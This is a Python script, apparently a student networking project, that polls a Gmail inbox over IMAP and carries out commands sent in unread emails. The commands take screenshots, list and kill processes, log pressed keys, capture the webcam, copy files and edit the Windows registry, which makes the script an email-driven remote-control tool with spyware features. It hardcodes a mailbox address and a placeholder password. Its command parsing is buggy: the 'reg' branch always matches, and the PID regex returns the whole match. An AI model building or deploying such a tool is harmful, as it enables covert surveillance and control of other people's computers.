import imaplib
import email
import time
import sys
import re

from reply_screenshot import reply_screenshot
from reply_process import reply_list_running_app, reply_stop_app
#from reply_shutdown_restart import reply_shutdown, reply_restart
from reply_pressed_key import reply_pressed_key
from reply_camera_capture import reply_camera_capture
from reply_copy_file import reply_copy_file
from reply_registry import reply_modify_reg

USERNAME = 'networkingass20120015@gmail.com'
PASSWORD = 'DummyPassword123'

if __name__ == '__main__':
    conn = imaplib.IMAP4_SSL('imap.gmail.com')
    
    try:
        retcode, capabilities = conn.login(USERNAME, PASSWORD)
    except:
        sys.exit(1)
    
    try:
        while True:
            conn.select("Inbox")
            retcode, messages = conn.search(None, '(UNSEEN)')
            if retcode == 'OK':
                for num in messages[0].split():
                    retcode, data = conn.fetch(num, '(RFC822)')
                    
                    _, bytes_data = data[0]
                    
                    email_message = email.message_from_bytes(bytes_data)
                    
                    body_message = ''
                    
                    for elem in email_message.walk():
                        if elem.get_content_type() == 'text/plain' or elem.get_content_type() == 'text/html':
                            body_message = elem.get_payload(decode=True).decode()
                            break
                    
                    body_message = body_message.lower()
                    
                    print(body_message)
                    
                    if 'screenshot' in body_message:
                        reply_screenshot(email_message, USERNAME, PASSWORD)
                    elif 'running app' in body_message:
                        reply_list_running_app(email_message, USERNAME, PASSWORD)
                    elif 'stop app pid ' in body_message:
                        try:
                            pid = int(re.match(r'.*stop app pid (\d+).*', body_message).group(0))
                            reply_stop_app(email_message, USERNAME, PASSWORD, pid)
                            print(pid)
                        except:
                            pass
                    elif 'shutdown' in body_message:
                        pass
                        #reply_shutdown(email_message, USERNAME, PASSWORD)
                    elif 'restart' in body_message:
                        pass
                        #reply_restart(email_message, USERNAME, PASSWORD)
                    elif 'catch pressed key' in body_message:
                        reply_pressed_key(email_message, USERNAME, PASSWORD)
                    elif 'camera' in body_message:
                        reply_camera_capture(email_message, USERNAME, PASSWORD)
                    elif 'copy' in body_message:
                        # Kinda lazy let just do this for now
                        ls = body_message.split()
                        pos = ls.index('copy')
                        
                        if pos + 2 < len(ls):
                            reply_copy_file(email_message, USERNAME, PASSWORD, ls[pos + 1], ls[pos + 2])
                    elif 'reg':
                        ls = body_message.split()
                        pos = ls.index('reg')
                        
                        if pos + 3 < len(ls):
                            reply_modify_reg(email_message, USERNAME, PASSWORD, ls[pos + 1], ls[pos + 2], ls[pos + 3])
                        
                        
                    retcode, data = conn.store(num, '+FLAGS', '(\\Seen)')
            
            time.sleep(5)
            
    except KeyboardInterrupt:
        print('Bye')
